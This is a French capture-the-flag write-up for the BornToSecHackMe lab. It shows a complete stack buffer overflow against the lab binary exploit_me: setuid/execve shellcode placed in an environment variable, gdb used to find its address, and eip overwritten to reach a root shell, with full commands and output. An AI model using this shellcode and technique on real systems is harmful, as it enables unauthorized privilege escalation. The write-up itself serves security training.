## BONUS 4

Ici nous nous retrouvons directement log en tant que zaz.

Pour ce bonus nous allons juste exploiter le programme exploit_me d'une facon différente :

Dans le writeup1.md nous avons fait un ret2libc. Ici nous allons injecter un shellecode dans une variable d'environnement pour ensuite écraser le registre eip afin de rediriger le flux d'exécution sur l'adresse de la variable d'environnement.

Montons notre exploit :

```
zaz@BornToSecHackMe:~$ export EGG=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x80483f7
Starting program: /home/zaz/exploit_me

Temporary breakpoint 1, 0x080483f7 in main ()
(gdb) x/10s *((char**)environ)
0xbffff849:	 "SHELL=/bin/bash"
0xbffff859:	 "TERM=xterm-256color"
0xbffff86d:	 "SSH_CLIENT=192.168.1.150 51329 22"
0xbffff88f:	 "SSH_TTY=/dev/pts/0"
0xbffff8a2:	 "EGG=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\322ShUni\nhdUUMhAhma\211\341\262\017\260\004̀1\300\061\333\061ɰ\027̀1\300Phn/shh//bi\211\343\215T$\bPS\215\f$\260\v̀1\300\260\001̀"
0xbffff955:	 "USER=zaz"
0xbffff95e:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffffa26:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffffaee:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffbb6:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
(gdb) q
A debugging session is active.

	Inferior 1 [process 2000] will be killed.

Quit anyway? (y or n) y
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A" * 140 + "\xa2\xf8\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
AhmadUUMUni
# id
uid=0(root) gid=1005(zaz) groups=0(root),1005(zaz)
# cd /root
# cat README
CONGRATULATIONS !!!!
To be continued...
#
```

Et voila, nous sommes root !
